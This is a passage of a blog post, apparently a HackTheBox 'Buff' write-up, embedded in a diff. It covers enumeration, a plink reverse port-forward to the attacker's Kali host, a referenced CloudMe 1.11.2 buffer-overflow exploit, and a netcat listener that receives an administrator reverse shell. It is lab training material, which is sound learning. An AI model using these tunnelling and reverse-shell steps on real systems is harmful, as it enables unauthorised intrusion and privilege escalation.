+  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">49667</span>          <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">49668</span>          <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">49669</span>          <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">139</span>       <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">8080</span>      <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.33</span><span class="p">:</span><span class="mi">37962</span>      <span class="n">ESTABLISHED</span>
+  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">8080</span>      <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.41</span><span class="p">:</span><span class="mi">34394</span>      <span class="n">FIN_WAIT_2</span>
+  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">8080</span>      <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.51</span><span class="p">:</span><span class="mi">58486</span>      <span class="n">CLOSE_WAIT</span>
+  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">8080</span>      <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.51</span><span class="p">:</span><span class="mi">58488</span>      <span class="n">TIME_WAIT</span>
+  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">8080</span>      <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.51</span><span class="p">:</span><span class="mi">58490</span>      <span class="n">ESTABLISHED</span>
+  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">50676</span>     <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.33</span><span class="p">:</span><span class="mi">22</span>         <span class="n">CLOSE_WAIT</span>
+  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">50809</span>     <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.33</span><span class="p">:</span><span class="mi">22</span>         <span class="n">ESTABLISHED</span>
+  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">50879</span>     <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.33</span><span class="p">:</span><span class="mi">22</span>         <span class="n">CLOSE_WAIT</span>
+  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">51491</span>     <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.33</span><span class="p">:</span><span class="mi">6969</span>       <span class="n">ESTABLISHED</span>
+  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">51506</span>     <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.33</span><span class="p">:</span><span class="mi">22</span>         <span class="n">ESTABLISHED</span>
+  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">51565</span>     <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.33</span><span class="p">:</span><span class="mi">1122</span>       <span class="n">ESTABLISHED</span>
+  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">53167</span>     <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.51</span><span class="p">:</span><span class="mi">22</span>         <span class="n">ESTABLISHED</span>
+  <span class="n">TCP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">53191</span>     <span class="mf">10.10</span><span class="p">.</span><span class="mf">14.51</span><span class="p">:</span><span class="mi">5577</span>       <span class="n">ESTABLISHED</span>
+  <span class="n">TCP</span>    <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">3306</span>         <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">8888</span>         <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">53175</span>        <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">3306</span>         <span class="n">TIME_WAIT</span>
+  <span class="n">TCP</span>    <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">53177</span>        <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">3306</span>         <span class="n">TIME_WAIT</span>
+  <span class="n">TCP</span>    <span class="p">[::]:</span><span class="mi">135</span>               <span class="p">[::]:</span><span class="mi">0</span>                 <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="p">[::]:</span><span class="mi">445</span>               <span class="p">[::]:</span><span class="mi">0</span>                 <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="p">[::]:</span><span class="mi">7680</span>              <span class="p">[::]:</span><span class="mi">0</span>                 <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="p">[::]:</span><span class="mi">8080</span>              <span class="p">[::]:</span><span class="mi">0</span>                 <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="p">[::]:</span><span class="mi">49664</span>             <span class="p">[::]:</span><span class="mi">0</span>                 <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="p">[::]:</span><span class="mi">49665</span>             <span class="p">[::]:</span><span class="mi">0</span>                 <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="p">[::]:</span><span class="mi">49666</span>             <span class="p">[::]:</span><span class="mi">0</span>                 <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="p">[::]:</span><span class="mi">49667</span>             <span class="p">[::]:</span><span class="mi">0</span>                 <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="p">[::]:</span><span class="mi">49668</span>             <span class="p">[::]:</span><span class="mi">0</span>                 <span class="n">LISTENING</span>
+  <span class="n">TCP</span>    <span class="p">[::]:</span><span class="mi">49669</span>             <span class="p">[::]:</span><span class="mi">0</span>                 <span class="n">LISTENING</span>
+  <span class="n">UDP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">123</span>            <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
+  <span class="n">UDP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">5050</span>           <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
+  <span class="n">UDP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">5353</span>           <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
+  <span class="n">UDP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">5355</span>           <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
+  <span class="n">UDP</span>    <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">64168</span>          <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
+  <span class="n">UDP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">137</span>       <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
+  <span class="n">UDP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">138</span>       <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
+  <span class="n">UDP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">1900</span>      <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
+  <span class="n">UDP</span>    <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.198</span><span class="p">:</span><span class="mi">59086</span>     <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
+  <span class="n">UDP</span>    <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">1900</span>         <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
+  <span class="n">UDP</span>    <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">58106</span>        <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
+  <span class="n">UDP</span>    <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">59087</span>        <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
+  <span class="n">UDP</span>    <span class="p">[::]:</span><span class="mi">123</span>               <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
+  <span class="n">UDP</span>    <span class="p">[::]:</span><span class="mi">5353</span>              <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
+  <span class="n">UDP</span>    <span class="p">[::]:</span><span class="mi">5355</span>              <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
+  <span class="n">UDP</span>    <span class="p">[::]:</span><span class="mi">64168</span>             <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
+  <span class="n">UDP</span>    <span class="p">[::</span><span class="mi">1</span><span class="p">]:</span><span class="mi">1900</span>             <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
+  <span class="n">UDP</span>    <span class="p">[::</span><span class="mi">1</span><span class="p">]:</span><span class="mi">59085</span>            <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
+  <span class="n">UDP</span>    <span class="p">[</span><span class="n">fe80</span><span class="p">::</span><span class="n">edcd</span><span class="p">:</span><span class="mi">7573</span><span class="p">:</span><span class="n">f6e</span><span class="p">:</span><span class="n">abdb</span><span class="o">%</span><span class="mi">10</span><span class="p">]:</span><span class="mi">1900</span>  <span class="o">*</span><span class="p">:</span><span class="o">*</span>                    
+  <span class="n">UDP</span>    <span class="p">[</span><span class="n">fe80</span><span class="p">::</span><span class="n">edcd</span><span class="p">:</span><span class="mi">7573</span><span class="p">:</span><span class="n">f6e</span><span class="p">:</span><span class="n">abdb</span><span class="o">%</span><span class="mi">10</span><span class="p">]:</span><span class="mi">59084</span>  <span class="o">*</span><span class="p">:</span><span class="o">*</span>                  
+</code></pre></div></div>
+
+<h3 id="comparing-the-procress-with-all-the-procress-details">Comparing the procress with all the procress details..</h3>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">C</span><span class="p">:\</span><span class="n">xampp</span><span class="p">\</span><span class="n">htdocs</span><span class="p">\</span><span class="n">gym</span><span class="p">\</span><span class="n">upload</span><span class="o">&gt;</span><span class="n">powershell</span> <span class="n">ps</span>
+<span class="n">powershell</span> <span class="n">ps</span>
+
+<span class="no">Handles</span>  <span class="no">NPM</span><span class="p">(</span><span class="no">K</span><span class="p">)</span>    <span class="no">PM</span><span class="p">(</span><span class="no">K</span><span class="p">)</span>      <span class="no">WS</span><span class="p">(</span><span class="no">K</span><span class="p">)</span>     <span class="no">CPU</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>     <span class="no">Id</span>  <span class="no">SI</span> <span class="no">ProcessName</span>                                                  
+<span class="o">-------</span>  <span class="o">------</span>    <span class="o">-----</span>      <span class="o">-----</span>     <span class="o">------</span>     <span class="o">--</span>  <span class="o">--</span> <span class="o">-----------</span>                                                  
+    <span class="mi">432</span>      <span class="mi">24</span>    <span class="mi">18324</span>       <span class="mi">9180</span>              <span class="mi">6612</span>   <span class="mi">1</span> <span class="no">ApplicationFrameHost</span>                                         
+    <span class="mi">161</span>      <span class="mi">10</span>     <span class="mi">1940</span>       <span class="mi">2176</span>              <span class="mi">7140</span>   <span class="mi">1</span> <span class="n">browser_broker</span>                                               
+    <span class="mi">237</span>      <span class="mi">19</span>    <span class="mi">26404</span>      <span class="mi">29328</span>              <span class="mi">5536</span>   <span class="mi">0</span> <span class="no">CloudMe</span>                                                      
+    <span class="mi">286</span>      <span class="mi">62</span>    <span class="mi">30312</span>        <span class="mi">372</span>              <span class="mi">6088</span>   <span class="mi">0</span> <span class="no">CloudMe</span>                                                      
+    <span class="mi">289</span>      <span class="mi">16</span>     <span class="mi">2896</span>       <span class="mi">2548</span>       <span class="mf">0.17</span>   <span class="mi">1396</span>   <span class="mi">0</span> <span class="no">CloudMe_1112</span>                                                 
+    <span class="mi">269</span>      <span class="mi">16</span>     <span class="mi">2868</span>        <span class="mi">200</span>       <span class="mf">0.98</span>   <span class="mi">8772</span>   <span class="mi">0</span> <span class="no">CloudMe_1112</span>      
+</code></pre></div></div>
+
+<p>This command in PowerShell is used to print what program/process is running. You can see 5536 is the PID of CloudMe software.</p>
+
+<p>This is conformed after finding <code class="language-plaintext highlighter-rouge">cloudme</code> is running in <code class="language-plaintext highlighter-rouge">Downloads</code> folder of <code class="language-plaintext highlighter-rouge">Shaun</code>.</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="n">shaun</span><span class="p">\</span><span class="no">Downloads</span><span class="o">&gt;</span><span class="n">dir</span>
+<span class="n">dir</span>
+ <span class="no">Volume</span> <span class="k">in</span> <span class="n">drive</span> <span class="no">C</span> <span class="n">has</span> <span class="n">no</span> <span class="n">label</span><span class="o">.</span>
+ <span class="no">Volume</span> <span class="no">Serial</span> <span class="no">Number</span> <span class="n">is</span> <span class="no">A22D</span><span class="o">-</span><span class="mi">49</span><span class="no">F7</span>
+
+ <span class="no">Directory</span> <span class="n">of</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="n">shaun</span><span class="p">\</span><span class="no">Downloads</span>
+
+<span class="mi">23</span><span class="o">/</span><span class="mo">07</span><span class="o">/</span><span class="mi">2020</span>  <span class="mo">07</span><span class="p">:</span><span class="mi">58</span>    <span class="o">&lt;</span><span class="no">DIR</span><span class="o">&gt;</span>          <span class="o">.</span>
+<span class="mi">23</span><span class="o">/</span><span class="mo">07</span><span class="o">/</span><span class="mi">2020</span>  <span class="mo">07</span><span class="p">:</span><span class="mi">58</span>    <span class="o">&lt;</span><span class="no">DIR</span><span class="o">&gt;</span>          <span class="o">..</span>
+<span class="mi">23</span><span class="o">/</span><span class="mo">07</span><span class="o">/</span><span class="mi">2020</span>  <span class="mo">05</span><span class="p">:</span><span class="mi">35</span>            <span class="mi">61</span><span class="p">,</span><span class="mi">440</span> <span class="n">nc</span><span class="p">.</span><span class="nf">exe</span>
+<span class="mi">23</span><span class="o">/</span><span class="mo">07</span><span class="o">/</span><span class="mi">2020</span>  <span class="mo">07</span><span class="p">:</span><span class="mi">56</span>           <span class="mi">675</span><span class="p">,</span><span class="mi">752</span> <span class="n">plink</span><span class="p">.</span><span class="nf">exe</span>
+               <span class="mi">3</span> <span class="no">File</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>     <span class="mi">18</span><span class="p">,</span><span class="mi">568</span><span class="p">,</span><span class="mo">016</span> <span class="n">bytes</span>
+               <span class="mi">2</span> <span class="no">Dir</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>   <span class="mi">9</span><span class="p">,</span><span class="mi">798</span><span class="p">,</span><span class="mi">672</span><span class="p">,</span><span class="mi">384</span> <span class="n">bytes</span> <span class="n">free</span>
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<h3 id="so-here-is-the-game-plan">So here is the game plan</h3>
+
+<p><code class="language-plaintext highlighter-rouge">Port forwarding to expose remote port 8888 (accessible only from localhost) to YOURPORT local</code></p>
+
+<h2 id="step-1">Step 1</h2>
+
+<h3 id="enable-sshd-service-on-your-kali-machine">Enable <code class="language-plaintext highlighter-rouge">sshd</code> service on your kali machine:</h3>
+<p><code class="language-plaintext highlighter-rouge">sudo systemctl start ssh.socket</code></p>
+
+<h2 id="step-2">Step 2</h2>
+<h3 id="use-plink-to-portforward-on-your-local-listener">Use <code class="language-plaintext highlighter-rouge">Plink</code> to portforward on your local listener</h3>
+
+<p><code class="language-plaintext highlighter-rouge">plink.exe -v -x -a -T -C -noagent -ssh -pw {Password} -R {Your_Port}:127.0.0.1:8888 user@{IP_address}</code></p>
+
+<p>If every thing works correctly.. You should see this ..</p>
+
+<p><img src="/assets/img/sample/buff/buff6.png" alt=""></p>
+
+<h2 id="cloudme-1112--cve--administrator">CloudMe 1.11.2 -CVE – Administrator:</h2>
+
+<p><code class="language-plaintext highlighter-rouge">Exploit for CloudMe 1.11.2: https://www.exploit-db.com/exploits/48389</code></p>
+
+<h3 id="the-shellcode-should-be-changed-in-order-to-get-the-reverse-shell">The shellcode should be changed in order to get the <code class="language-plaintext highlighter-rouge">reverse shell</code>.</h3>
+<hr>
+<hr>
+
+<h2 id="note">Note:</h2>
+
+<p><code> Use some higher port in order to get the reverse shell perfectly, cause there are so many people bashing the same machine at same time.</code></p>
+
+<hr>
+<h3 id="you-should-see-this-if-the-exploit-runs-correctly">you should see this if the exploit runs correctly.</h3>
+
+<p><img src="/assets/img/sample/buff/buff7.png" alt=""></p>
+
+<p>Once Every this is set and run properly then you should be good to get the <code class="language-plaintext highlighter-rouge">reverse shell</code> and grab the <code class="language-plaintext highlighter-rouge">Root.txt</code></p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nc</span> <span class="o">-</span><span class="n">lnvp</span> <span class="mi">60000</span>
+<span class="n">listening</span> <span class="n">on</span> <span class="p">[</span><span class="n">any</span><span class="p">]</span> <span class="mi">60000</span> <span class="o">...</span>
+<span class="n">connect</span> <span class="n">to</span> <span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">14.51</span><span class="p">]</span> <span class="n">from</span> <span class="p">(</span><span class="no">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.198</span><span class="p">]</span> <span class="mi">49723</span>
+<span class="no">Microsoft</span> <span class="no">Windows</span> <span class="p">[</span><span class="no">Version</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">17134.1550</span><span class="p">]</span>
+<span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="mi">2018</span> <span class="no">Microsoft</span> <span class="no">Corporation</span><span class="o">.</span> <span class="no">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="o">.</span>
+
+<span class="no">C</span><span class="p">:\</span><span class="no">Windows</span><span class="p">\</span><span class="n">system32</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<h2 id="getting-roottxt">Getting Root.txt</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">system32</span><span class="o">&gt;</span><span class="n">cd</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Desktop</span>
+<span class="n">cd</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Desktop</span>
+
+<span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Desktop</span><span class="o">&gt;</span><span class="nb">type</span> <span class="n">root</span><span class="p">.</span><span class="n">txt</span>
+<span class="nb">type</span> <span class="n">root</span><span class="p">.</span><span class="n">txt</span>
+<span class="mf">2e881649240</span><span class="n">e8868c48daee707659212</span>
+
+<span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\
+</code></pre></div></div>
+<p>If you like my work, please do consider giving me +rep on HACKTHEBOX.</p>
+
+<p>My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291968">https://www.hackthebox.eu/home/users/profile/291968</a></p>
+
+
+    </div>
+
+</article>
+<div class="post-nav">
+<a class="previous" href="/hackthebox/2020/07/11/Blackfield.html" title="Hackthebox Blackfiled">Hackthebox Blackfiled</a><a class="next" href="/otherposts/2020/10/17/OSCP.html" title='My  journey  towards  "TRY  HARDER!"'>My  journey  towards  "TRY  HARDER!"</a>
+</div>
+<div class="post-related">
+      <div>Related Articles</div>
+      <ul>
+        <li><a class="post-link" href="/hackthebox/retired/2020/03/10/Blue.html" title='My  journey  towards  "TRY  HARDER!"'>HackTheBox Blue</a></li>
+<li><a class="post-link" href="/tryhackme/2020/03/29/Mrrobot.html" title='My  journey  towards  "TRY  HARDER!"'>Tryhackme MrRobot</a></li>
+<li><a class="post-link" href="/hackthebox/2020/07/11/Blackfield.html" title='My  journey  towards  "TRY  HARDER!"'>Hackthebox Blackfiled</a></li>
+<li><a class="post-link" href="/otherposts/2020/04/15/Kali-Linux-Tools.html" title='My  journey  towards  "TRY  HARDER!"'>Kali-Linux-Tools</a></li>
+</ul>
+    </div>
+<div class="post-comments"></div></section>
+</div>
+
+
+  </section>
+  <section class="sidebar" style="margin-left: 15px;">
+    <!-- Get sidebar items --><style type="text/css" media="screen">
+.post-menu ul {
+  list-style: none;
+  padding: 0;
+  margin: 0;
+}
+</style>
+
+<div class="post-menu">
+  <div class="post-menu-title"> Contents</div>
+  <div class="post-menu-content"></div>
+</div>
+
+<script>
+  function generateContent() {
+    var menu = document.querySelector(".post-menu");
+    var menuContent =  menu.querySelector(".post-menu-content");
+    var headings = document.querySelector(".post-content").querySelectorAll("h2, h3, h4, h5, h6");
+
+    // Hide menu when no headings
+    if (headings.length === 0) {
+      return menu.style.display = "none";
+    }
+
+    // Generate post menu
+    var menuHTML = '';
+    for (var i = 0; i < headings.length; i++) {
+      var h = headings[i];
+      menuHTML += (
+        '<li class="h-' + h.tagName.toLowerCase() + '">'
+        + '<a href="#h-' + h.getAttribute('id') + '">' + h.textContent + '</a></li>');
+    }
+
+    menuContent.innerHTML = '<ul>' + menuHTML + '</ul>';
+
+    // The header element
+    var header = document.querySelector('header.site-header');
+
+    function doMenuCollapse(index, over_items) {
+      var items = menuContent.firstChild.children;
+
+      if (over_items == undefined) {
+        over_items = 20;
+      }
+
+      if (items.length < over_items) {
+        return;
+      }
+
+      var activeItem = items[index];
+      var beginItem = activeItem
+      var endItem = activeItem
+      var beginIndex = index;
+      var endIndex = index + 1;
+      while (beginIndex >= 0
+        && !items[beginIndex].classList.contains('h-h2')) {
+        beginIndex -= 1;
+      }
+      while (endIndex < items.length
+        && !items[endIndex].classList.contains('h-h2')) {
+        endIndex += 1;
+      }
+      for (var i = 0; i < beginIndex; i++) {
+        item = items[i]
+        if (!item.classList.contains('h-h2')) {
+          item.style.display = 'none';
+        }
+      }
+      for (var i = beginIndex + 1; i < endIndex; i++) {
+        item = items[i]
+        // if (!item.classList.contains('h-h2')) {
+          item.style.display = '';
+        // }
+      }
+      for (var i = endIndex; i < items.length; i++) {
+        item = items[i]
+        if (!item.classList.contains('h-h2')) {
+          item.style.display = 'none';
+        }
+      }
+    }
+
+    // Init menu collapsed
+    doMenuCollapse(-1);
+
+    // Active the menu item
+    window.addEventListener('scroll', function (event) {
+      var lastActive = menuContent.querySelector('.active');
+      var changed = true;
+      var activeIndex = -1;
+      for (var i = headings.length - 1; i >= 0; i--) {
+        var h = headings[i];
+        var headingRect = h.getBoundingClientRect();
+        var headerRect = header.getBoundingClientRect();
+        var headerTop = Math.floor(headerRect.top);
+        var headerHeight = Math.floor(headerRect.height);
+        var headerHeight = headerTop + headerHeight + 20;
+        if (headingRect.top <= headerHeight) {
+          var id = 'h-' + h.getAttribute('id');
+          var a = menuContent.querySelector('a[href="#' + id  + '"]');
+          var curActive = a.parentNode;
+          if (curActive) {
+            curActive.classList.add('active');
+            activeIndex = i;
+          }
+          if (lastActive == curActive) {
+            changed = false;
+          }
+          break;
+        }
+      }
+      if (changed) {
+        if (lastActive) {
+          lastActive.classList.remove('active');
+        }
+        doMenuCollapse(activeIndex);
+      }
+      event.preventDefault();
+    });
+  }
+  generateContent();
+</script>
+</section>
+</div>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+    <div class="site-footer-inner">
+      <div>Copyright © 2020-2022 @Jeevan</div>
+      <div>Powered by <a title="Jekyll is a simple, blog-aware, static site
+      generator." href="http://jekyllrb.com/">Jekyll</a> &amp; <a title="Yat, yet
+      another theme." href="https://github.com/jeffreytse/jekyll-theme-yat">Yat Theme</a>.</div>
+      
+    </div>
+  </div>
+</footer>
+</body>
+</html>
